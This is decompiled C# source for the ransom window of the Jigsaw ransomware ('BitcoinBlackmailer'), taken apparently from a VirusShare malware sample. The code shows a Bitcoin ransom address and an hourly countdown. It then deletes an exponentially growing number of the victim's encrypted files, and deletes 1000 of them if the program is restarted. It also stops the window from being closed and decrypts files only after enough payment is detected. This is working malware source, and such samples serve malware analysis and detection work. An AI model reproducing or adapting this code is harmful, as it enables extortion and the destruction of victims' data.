// Decompiled with JetBrains decompiler
// Type: Main.FormGame
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1950B17F-8BE4-40AB-B698-96070A0C2297
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-31a9ca0a1f20618bf113dd2b03a0cb28fc003a800e49c74b97e9baca5acc26e2.exe

using Main.Properties;
using Main.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Main
{
  public class FormGame : Form
  {
    private static int _timeLeftSec;
    private static int _exponent;
    private const double Base = 1.1;
    private static int _indexNum;
    private IContainer components;
    private Label labelWelcome;
    private Timer timerTypingEffect;
    private Label labelTask;
    private TextBox textBoxAddress;
    private Button buttonCheckPayment;
    private Button buttonViewEncryptedFiles;
    private Timer timerCountDown;
    private Label labelCountDown;
    private Label labelFilesToDelete;

    public FormGame() => this.InitializeComponent();

    private void FormGame_Load(object sender, EventArgs e)
    {
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      Main.Tools.Windows.MakeTopMost((Form) this);
      this.timerTypingEffect.Interval = 125;
      this.timerTypingEffect.Enabled = true;
      this.labelWelcome.Text = "";
      this.labelTask.Text = Config.TaskMessage;
      this.labelTask.Visible = false;
      this.textBoxAddress.ReadOnly = true;
      this.textBoxAddress.Text = FormGame.GetBitcoinAddess();
      this.textBoxAddress.Visible = false;
      this.buttonCheckPayment.Visible = false;
      this.buttonViewEncryptedFiles.Visible = false;
      this.labelCountDown.Visible = false;
      this.timerCountDown.Enabled = false;
      this.labelFilesToDelete.Visible = false;
      if (!FormGame.DidRun())
        return;
      FormGame.DeleteFiles(1000);
    }

    private static bool DidRun()
    {
      string path = Path.Combine(Config.WorkFolderPath, "dr");
      if (File.Exists(path))
        return true;
      File.WriteAllText(path, "21");
      return false;
    }

    private static void DeleteFiles(int num)
    {
      try
      {
        int num1 = 0;
        foreach (string encryptedFile in Locker.GetEncryptedFiles())
        {
          if (num1 == num)
            break;
          File.Delete(encryptedFile + ".fun");
          ++num1;
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static string GetBitcoinAddess()
    {
      string path = Path.Combine(Config.WorkFolderPath, "Address.txt");
      if (File.Exists(path))
        return File.ReadAllText(path);
      HashSet<string> source = new HashSet<string>();
      string vanityAddresses = Resources.vanityAddresses;
      string[] separator = new string[1]
      {
        Environment.NewLine
      };
      foreach (string str in ((IEnumerable<string>) vanityAddresses.Split(separator, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
        source.Add(str.Trim());
      string contents = source.OrderBy<string, Guid>((Func<string, Guid>) (x => Guid.NewGuid())).FirstOrDefault<string>();
      File.WriteAllText(path, contents);
      return contents;
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ClassStyle |= 512;
        return createParams;
      }
    }

    private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
    {
      e.Cancel = true;
      int num = (int) MessageBox.Show((IWin32Window) this, "You are about to make a very bad decision. Are you sure about it?");
    }

    private void timerTypingEffect_Tick(object sender, EventArgs e)
    {
      string welcomeMessage = Config.WelcomeMessage;
      this.labelWelcome.Text = welcomeMessage.Substring(0, FormGame._indexNum) + "_";
      ++FormGame._indexNum;
      if (FormGame._indexNum != welcomeMessage.Length + 1)
        return;
      this.timerTypingEffect.Enabled = false;
      this.labelTask.Visible = true;
      this.textBoxAddress.Visible = true;
      this.buttonCheckPayment.Visible = true;
      this.buttonViewEncryptedFiles.Visible = true;
      this.labelCountDown.Visible = true;
      this.timerCountDown.Enabled = true;
      this.labelFilesToDelete.Visible = true;
      FormGame._timeLeftSec = 3600;
    }

    private void buttonCheckPayment_Click(object sender, EventArgs e)
    {
      try
      {
        double price = Blockr.GetPrice();
        int num1 = (int) (Blockr.GetBalanceBtc(FormGame.GetBitcoinAddess()) * price);
        if (num1 > Config.RansomUsd)
        {
          this.timerCountDown.Stop();
          this.buttonCheckPayment.Enabled = false;
          this.buttonCheckPayment.BackColor = Color.Lime;
          this.buttonCheckPayment.Text = "Great job, I'm decrypting your files...";
          int num2 = (int) MessageBox.Show((IWin32Window) this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
          Locker.DecryptFiles(".fun");
          Hacking.RemoveItself();
        }
        else if (num1 > 0)
        {
          this.buttonCheckPayment.BackColor = Color.Tomato;
          this.buttonCheckPayment.Text = "You did not sent me enough! Try again!";
        }
        else
        {
          this.buttonCheckPayment.BackColor = Color.Tomato;
          this.buttonCheckPayment.Text = "You haven't made payment yet! Try again!";
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
        this.buttonCheckPayment.Text = "Are you connected to the internet? Try again!";
        this.buttonCheckPayment.BackColor = Color.Tomato;
      }
    }

    private void buttonViewEncryptedFiles_Click(object sender, EventArgs e) => new FormEncryptedFiles().Show((IWin32Window) this);

    private void timerCountDown_Tick(object sender, EventArgs e)
    {
      if (FormGame._timeLeftSec > 0)
      {
        --FormGame._timeLeftSec;
        this.labelCountDown.Text = (FormGame._timeLeftSec / 60).ToString() + ":" + (object) (FormGame._timeLeftSec % 60);
      }
      else
      {
        FormGame._timeLeftSec = 3600;
        int num = (int) Math.Pow(1.1, (double) FormGame._exponent);
        this.labelFilesToDelete.Text = num.ToString() + " files will be deleted";
        ++FormGame._exponent;
        FormGame.DeleteFiles(num);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.labelWelcome = new Label();
      this.timerTypingEffect = new Timer(this.components);
      this.labelTask = new Label();
      this.textBoxAddress = new TextBox();
      this.buttonCheckPayment = new Button();
      this.buttonViewEncryptedFiles = new Button();
      this.timerCountDown = new Timer(this.components);
      this.labelCountDown = new Label();
      this.labelFilesToDelete = new Label();
      this.SuspendLayout();
      this.labelWelcome.AutoSize = true;
      this.labelWelcome.BackColor = Color.Black;
      this.labelWelcome.Font = new Font("Lucida Console", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.labelWelcome.ForeColor = Color.Lime;
      this.labelWelcome.Location = new Point(25, 29);
      this.labelWelcome.Name = "labelWelcome";
      this.labelWelcome.Size = new Size(218, 16);
      this.labelWelcome.TabIndex = 0;
      this.labelWelcome.Text = "I want to play a game";
      this.timerTypingEffect.Tick += new EventHandler(this.timerTypingEffect_Tick);
      this.labelTask.AutoSize = true;
      this.labelTask.BackColor = Color.Black;
      this.labelTask.Font = new Font("Lucida Console", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.labelTask.ForeColor = Color.Lime;
      this.labelTask.Location = new Point(25, 505);
      this.labelTask.Name = "labelTask";
      this.labelTask.Size = new Size(239, 16);
      this.labelTask.TabIndex = 1;
      this.labelTask.Text = "All you have to do...";
      this.textBoxAddress.Location = new Point(28, 524);
      this.textBoxAddress.Name = "textBoxAddress";
      this.textBoxAddress.Size = new Size(348, 20);
      this.textBoxAddress.TabIndex = 2;
      this.textBoxAddress.Text = "12Xspzstah37626slkwKhsKSHA";
      this.buttonCheckPayment.BackColor = Color.Gold;
      this.buttonCheckPayment.Location = new Point(28, 551);
      this.buttonCheckPayment.Name = "buttonCheckPayment";
      this.buttonCheckPayment.Size = new Size(348, 33);
      this.buttonCheckPayment.TabIndex = 3;
      this.buttonCheckPayment.Text = "I made a payment, now give me back my files!";
      this.buttonCheckPayment.UseVisualStyleBackColor = false;
      this.buttonCheckPayment.Click += new EventHandler(this.buttonCheckPayment_Click);
      this.buttonViewEncryptedFiles.BackColor = Color.Gray;
      this.buttonViewEncryptedFiles.Location = new Point(28, 479);
      this.buttonViewEncryptedFiles.Name = "buttonViewEncryptedFiles";
      this.buttonViewEncryptedFiles.Size = new Size(348, 23);
      this.buttonViewEncryptedFiles.TabIndex = 4;
      this.buttonViewEncryptedFiles.Text = "View encrypted files";
      this.buttonViewEncryptedFiles.UseVisualStyleBackColor = false;
      this.buttonViewEncryptedFiles.Click += new EventHandler(this.buttonViewEncryptedFiles_Click);
      this.timerCountDown.Interval = 1000;
      this.timerCountDown.Tick += new EventHandler(this.timerCountDown_Tick);
      this.labelCountDown.AutoSize = true;
      this.labelCountDown.BackColor = Color.Black;
      this.labelCountDown.BorderStyle = BorderStyle.Fixed3D;
      this.labelCountDown.Font = new Font("Lucida Sans Unicode", 48f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.labelCountDown.ForeColor = Color.DarkRed;
      this.labelCountDown.Location = new Point(28, 320);
      this.labelCountDown.Name = "labelCountDown";
      this.labelCountDown.Size = new Size(220, 80);
      this.labelCountDown.TabIndex = 5;
      this.labelCountDown.Text = "59:59";
      this.labelFilesToDelete.AutoSize = true;
      this.labelFilesToDelete.BackColor = Color.Black;
      this.labelFilesToDelete.Font = new Font("Lucida Console", 12f, FontStyle.Bold);
      this.labelFilesToDelete.ForeColor = Color.Lime;
      this.labelFilesToDelete.Location = new Point(24, 455);
      this.labelFilesToDelete.Name = "labelFilesToDelete";
      this.labelFilesToDelete.Size = new Size(261, 16);
      this.labelFilesToDelete.TabIndex = 6;
      this.labelFilesToDelete.Text = "1 file will be deleted.";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) Resources.Jigsaw;
      this.ClientSize = new Size(840, 596);
      this.Controls.Add((Control) this.labelFilesToDelete);
      this.Controls.Add((Control) this.labelCountDown);
      this.Controls.Add((Control) this.buttonViewEncryptedFiles);
      this.Controls.Add((Control) this.buttonCheckPayment);
      this.Controls.Add((Control) this.textBoxAddress);
      this.Controls.Add((Control) this.labelTask);
      this.Controls.Add((Control) this.labelWelcome);
      this.Name = nameof (FormGame);
      this.FormClosing += new FormClosingEventHandler(this.FormGame_FormClosing);
      this.Load += new EventHandler(this.FormGame_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
